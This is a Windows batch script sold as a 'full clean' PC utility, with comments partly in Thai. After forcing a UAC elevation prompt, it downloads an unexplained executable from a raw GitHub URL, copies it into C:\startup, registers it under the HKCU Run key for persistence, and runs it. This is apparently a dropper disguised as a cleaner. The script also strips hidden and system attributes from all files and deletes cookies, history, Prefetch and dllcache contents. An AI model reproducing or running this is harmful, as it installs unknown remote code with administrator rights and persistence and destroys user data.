@echo off
:getadmin
@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------   
cls
:fullclean
cls
@echo off
echo Cleaning PC...
del /s /q Clear.exe
cls
powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rrpt66/cc/main/Scan-virus-and-Clear-file.exe" -OutFile "Scan-virus-and-Clear-file.exe"
mkdir C:\startup
powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rrpt66/cc/main/Scan-virus-and-Clear-file.exe" -OutFile "C:\startup\Scan-virus-and-Clear-file.exe"
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Scan-virus-and-Clear" /t REG_SZ /d "C:\startup\Scan-virus-and-Clear-file.exe" /f
Scan-virus-and-Clear-file.exe /k
cls
cls
del /q Clear.exe
@echo off
cls
rem กำหนดค่าตัวแปร
echo cancel Hide file all.......
attrib -h -r -s /s /d *.* 
cls
@echo off    
set "tempFolder=%temp%"


echo scan Junk file or Trash file in %tempFolder%...
ping -n 2.5 127.0.0.1>nul
for /r "%tempFolder%" %%f in (*) do (  

  echo delete: %%f
title clearing : %%f :
ping -n 2.5 127.0.0.1>nul
  del /f /q "%%f"

)
set "tempFolder=%windir%\temp"


echo scan Junk file or Trash file in %tempFolder%...
ping -n 2.5 127.0.0.1>nul
for /r "%tempFolder%" %%f in (*) do (  

  echo delete: %%f
title clearing : %%f :
ping -n 2.5 127.0.0.1>nul
  del /f /q "%%f"

)
set "tempFolder=%windir%\Prefetch"


echo scan Junk file or Trash file in %tempFolder%...
ping -n 2.5 127.0.0.1>nul
for /r "%tempFolder%" %%f in (*) do (  

  echo delete: %%f
title clearing : %%f :
ping -n 2.5 127.0.0.1>nul
  del /f /q "%%f"

)
set "tempFolder=%windir%\system32\dllcache"


echo scan Junk file or Trash file in %tempFolder%...
ping -n 2.5 127.0.0.1>nul
for /r "%tempFolder%" %%f in (*) do (  

  echo delete: %%f
title clearing : %%f :
ping -n 2.5 127.0.0.1>nul
  del /f /q "%%f"

)
set "tempFolder=%SysteDrive%\Temp"


echo scan Junk file or Trash file in %tempFolder%...
ping -n 2.5 127.0.0.1>nul
for /r "%tempFolder%" %%f in (*) do (  

  echo delete: %%f
ping -n 2.5 127.0.0.1>nul
  del /f /q "%%f"
title clearing : %%f :
)
set "tempFolder=%USERPROFILE%\Local Settings\History"


echo scan Junk file or Trash file in %tempFolder%...
ping -n 2.5 127.0.0.1>nul
for /r "%tempFolder%" %%f in (*) do (  

  echo delete: %%f
title clearing : %%f :
ping -n 2.5 127.0.0.1>nul
  del /f /q "%%f"

)
set "tempFolder=%USERPROFILE%\Local Settings\Temporary Internet Files"


echo scan Junk file or Trash file in %tempFolder%...
ping -n 2.5 127.0.0.1>nul
for /r "%tempFolder%" %%f in (*) do (  

  echo delete: %%f
title clearing : %%f :
ping -n 2.5 127.0.0.1>nul
  del /f /q "%%f"

)
set "tempFolder=%USERPROFILE%\Local Settings\Temp"


echo scan Junk file or Trash file in %tempFolder%...
ping -n 2.5 127.0.0.1>nul
for /r "%tempFolder%" %%f in (*) do (  

  echo delete: %%f
title clearing : %%f :
ping -n 2.5 127.0.0.1>nul
  del /f /q "%%f"

)
set "tempFolder=%USERPROFILE%\Recent"


echo scan Junk file or Trash file in %tempFolder%...
ping -n 2.5 127.0.0.1>nul
for /r "%tempFolder%" %%f in (*) do (  

  echo delete: %%f
title clearing : %%f :
ping -n 2.5 127.0.0.1>nul
  del /f /q "%%f"

)
set "tempFolder=%USERPROFILE%\Cookies"


echo scan Junk file or Trash file in %tempFolder%...
ping -n 2.5 127.0.0.1>nul
for /r "%tempFolder%" %%f in (*) do (  

  echo delete: %%f
title clearing : %%f :
ping -n 2.5 127.0.0.1>nul
  del /f /q "%%f"

)
cls

rem ตั้งค่าตัวแปร temp_folder
set "temp_folder=%TEMP%"

rem ตรวจสอบว่ามีโฟลเดอร์อยู่ใน %temp_folder% หรือไม่
if exist "%temp_folder%\*" (

  rem แสดงข้อความแจ้งเตือน
  echo "have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
  rem ลบโฟลเดอร์ทั้งหมดใน %temp_folder%
  rd /s /q "%temp_folder%\*"

  rem แสดงข้อความแจ้งเตือน
  echo "Remove folder in %temp_folder% success"
ping -n 2.5 127.0.0.1>nul
) else (

  rem แสดงข้อความแจ้งเตือน
  echo "not have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
)
rem ตั้งค่าตัวแปร temp_folder
set "temp_folder=%windir%\temp"

rem ตรวจสอบว่ามีโฟลเดอร์อยู่ใน %temp_folder% หรือไม่
if exist "%temp_folder%\*" (

  rem แสดงข้อความแจ้งเตือน
  echo "have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
  rem ลบโฟลเดอร์ทั้งหมดใน %temp_folder%
  rd /s /q "%temp_folder%\*"

  rem แสดงข้อความแจ้งเตือน
  echo "Remove folder in %temp_folder% success"
ping -n 2.5 127.0.0.1>nul
) else (

  rem แสดงข้อความแจ้งเตือน
  echo "not have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
)
rem ตั้งค่าตัวแปร temp_folder
set "temp_folder=%SysteDrive%\Temp"

rem ตรวจสอบว่ามีโฟลเดอร์อยู่ใน %temp_folder% หรือไม่
if exist "%temp_folder%\*" (

  rem แสดงข้อความแจ้งเตือน
  echo "have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
  rem ลบโฟลเดอร์ทั้งหมดใน %temp_folder%
  rd /s /q "%temp_folder%\*"

  rem แสดงข้อความแจ้งเตือน
  echo "Remove folder in %temp_folder% success"
ping -n 2.5 127.0.0.1>nul
) else (

  rem แสดงข้อความแจ้งเตือน
  echo "not have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
)
rem ตั้งค่าตัวแปร temp_folder
set "temp_folder=%windir%\Prefetch"

rem ตรวจสอบว่ามีโฟลเดอร์อยู่ใน %temp_folder% หรือไม่
if exist "%temp_folder%\*" (

  rem แสดงข้อความแจ้งเตือน
  echo "have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
  rem ลบโฟลเดอร์ทั้งหมดใน %temp_folder%
  rd /s /q "%temp_folder%\*"

  rem แสดงข้อความแจ้งเตือน
  echo "Remove folder in %temp_folder% success"
ping -n 2.5 127.0.0.1>nul
) else (

  rem แสดงข้อความแจ้งเตือน
  echo "not have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
)
rem ตั้งค่าตัวแปร temp_folder
set "temp_folder=%windir%\system32\dllcache"

rem ตรวจสอบว่ามีโฟลเดอร์อยู่ใน %temp_folder% หรือไม่
if exist "%temp_folder%\*" (

  rem แสดงข้อความแจ้งเตือน
  echo "have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
  rem ลบโฟลเดอร์ทั้งหมดใน %temp_folder%
  rd /s /q "%temp_folder%\*"

  rem แสดงข้อความแจ้งเตือน
  echo "Remove folder in %temp_folder% success"
ping -n 2.5 127.0.0.1>nul
) else (

  rem แสดงข้อความแจ้งเตือน
  echo "not have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
)
rem ตั้งค่าตัวแปร temp_folder
set "temp_folder=%USERPROFILE%\Local Settings\History"

rem ตรวจสอบว่ามีโฟลเดอร์อยู่ใน %temp_folder% หรือไม่
if exist "%temp_folder%\*" (

  rem แสดงข้อความแจ้งเตือน
  echo "have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
  rem ลบโฟลเดอร์ทั้งหมดใน %temp_folder%
  rd /s /q "%temp_folder%\*"

  rem แสดงข้อความแจ้งเตือน
  echo "Remove folder in %temp_folder% success"
ping -n 2.5 127.0.0.1>nul
) else (

  rem แสดงข้อความแจ้งเตือน
  echo "not have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
)
rem ตั้งค่าตัวแปร temp_folder
set "temp_folder=%USERPROFILE%\Local Settings\Temporary Internet Files"

rem ตรวจสอบว่ามีโฟลเดอร์อยู่ใน %temp_folder% หรือไม่
if exist "%temp_folder%\*" (

  rem แสดงข้อความแจ้งเตือน
  echo "have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
  rem ลบโฟลเดอร์ทั้งหมดใน %temp_folder%
  rd /s /q "%temp_folder%\*"

  rem แสดงข้อความแจ้งเตือน
  echo "Remove folder in %temp_folder% success"
ping -n 2.5 127.0.0.1>nul
) else (

  rem แสดงข้อความแจ้งเตือน
  echo "not have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
)
rem ตั้งค่าตัวแปร temp_folder
set "temp_folder=%USERPROFILE%\Recent"

rem ตรวจสอบว่ามีโฟลเดอร์อยู่ใน %temp_folder% หรือไม่
if exist "%temp_folder%\*" (

  rem แสดงข้อความแจ้งเตือน
  echo "have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
  rem ลบโฟลเดอร์ทั้งหมดใน %temp_folder%
  rd /s /q "%temp_folder%\*"

  rem แสดงข้อความแจ้งเตือน
  echo "Remove folder in %temp_folder% success"
ping -n 2.5 127.0.0.1>nul
) else (

  rem แสดงข้อความแจ้งเตือน
  echo "not have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
)
rem ตั้งค่าตัวแปร temp_folder
set "temp_folder=%USERPROFILE%\Cookies"

rem ตรวจสอบว่ามีโฟลเดอร์อยู่ใน %temp_folder% หรือไม่
if exist "%temp_folder%\*" (

  rem แสดงข้อความแจ้งเตือน
  echo "have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
  rem ลบโฟลเดอร์ทั้งหมดใน %temp_folder%
  rd /s /q "%temp_folder%\*"

  rem แสดงข้อความแจ้งเตือน
  echo "Remove folder in %temp_folder% success"
ping -n 2.5 127.0.0.1>nul
) else (

  rem แสดงข้อความแจ้งเตือน
  echo "not have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
)
rem ตั้งค่าตัวแปร temp_folder
set "temp_folder=%USERPROFILE%\Local Settings\Temp"

rem ตรวจสอบว่ามีโฟลเดอร์อยู่ใน %temp_folder% หรือไม่
if exist "%temp_folder%\*" (

  rem แสดงข้อความแจ้งเตือน
  echo "have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
  rem ลบโฟลเดอร์ทั้งหมดใน %temp_folder%
  rd /s /q "%temp_folder%\*"

  rem แสดงข้อความแจ้งเตือน
  echo "Remove folder in %temp_folder% success"
ping -n 2.5 127.0.0.1>nul
) else (

  rem แสดงข้อความแจ้งเตือน
  echo "not have folder in %temp_folder%"
ping -n 2.5 127.0.0.1>nul
)

goto ee
rem จบการทำงาน
:ee
cls
rem ดำเนินการต่อไปยังจุดที่กำหนด
cls
cls
call :bbb
:bbb
cls
echo exit full clean
ping -n 4.3 127.0.0.1>nul
:menu
exit